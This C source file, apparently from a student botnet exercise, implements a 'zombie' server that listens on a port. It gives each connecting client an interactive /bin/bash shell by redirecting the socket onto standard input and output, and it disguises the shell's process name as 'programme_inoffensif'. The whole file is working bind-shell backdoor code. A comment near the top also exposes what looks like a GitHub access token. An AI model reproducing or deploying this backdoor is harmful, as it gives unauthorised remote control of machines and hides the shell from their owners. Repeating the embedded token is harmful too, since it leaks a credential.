#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdarg.h>
#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
//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
#include "utils_v2.h"
#include "port.h"
#include "botNet.h"

int getFreePort(int sockfd);
int validPort(int sockfd,int port);

Zombie initSocketServer(bool withPort, int portReceived){
	int sockfd = ssocket();
	int port;
	if(withPort == true){
		port = validPort(sockfd,portReceived);
	}else
	{
		port = getFreePort(sockfd);
	}
	
	slisten(sockfd, BACKLOG);
	Zombie zombie= {
		"zombiO.c", "127.0.0.1", port, sockfd,0 
	};
	return zombie;
}

void createBash (void * sock){
	int* socket = sock;
	for (int i = 0; i < 3; ++i){
		dup2(*socket,i);
	}
	zombie.pid=getpid();
	sexecl("/bin/bash", "programme_inoffensif", NULL);

}

void done(){
	printf("fini\n");
	for (int i = 0; i < numberChild; ++i){
		skill(tabChild[i],SIGINT);
	}
	sclose(zombie.sockFd);

	exit(0);
}

int main(int argc, char const *argv[]){
	if(argc == 2)
		zombie = initSocketServer(true,atoi(argv[1]));
	else 
		zombie = initSocketServer(false,-1);
	

	ssigaction(SIGINT,done);
	printf("Le serveur tourne sur le port : %i  grace à souli\n", zombie.port);	
	int newsockfd =0;
	while((newsockfd = saccept(zombie.sockFd))>0){	
		swrite(newsockfd, &zombie, sizeof(Zombie));
		int childId=fork_and_run1(createBash,&newsockfd);
		tabChild[numberChild]=childId;
		numberChild++;
	}
		

	
	sclose(newsockfd);
	sclose(zombie.sockFd);
	return 0;
}

